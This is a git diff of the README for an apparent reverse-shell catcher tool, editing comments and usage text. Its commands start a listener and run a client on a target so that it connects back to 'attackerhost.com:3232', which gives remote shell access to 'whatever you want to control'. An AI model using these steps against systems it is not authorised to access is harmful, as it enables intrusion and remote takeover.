@@ -35,13 +35,14 @@ The reverse SSH server lets you catch multiple reverse shells, using the fully s
 make
 cd bin/
 
+# start the server
 cp ~/.ssh/id_ed25519.pub authorized_keys
 ./server 0.0.0.0:3232
 
-#copy client to your target 
+# copy client to your target then connect to the server
 ./client attackerhost.com:3232
 
-#connect to the server from your attacker host
+# connect to the server from your attacker host
 ssh localhost -p 3232
 ```
 
@@ -65,19 +66,20 @@ GOOS=windows GOARCH=amd64 make client # will create client.exe
 
 You will need to create an `authorized_keys` file, containing *your* public key.
 This will allow you to control whatever server catches.
+Alternatively, you can use the --authorizedkeys flag to point to a file.
 
 ```sh
 cp ~/.ssh/id_ed25519.pub authorized_keys
 ./server 0.0.0.0:3232 #Set the server to listen on port 3232
 ```
 
-Put the client binary on whatever you want to control.
+Put the client binary on whatever you want to control, then connect to the server.
 
 ```sh
 ./client yourserver.com:3232
 ```
 
-Then connect to your reverse shell catcher server:
+Finally connect to your reverse shell catcher server to administrate, connect through etc:
 
 ```sh
 ssh yourserver.com -p 3232
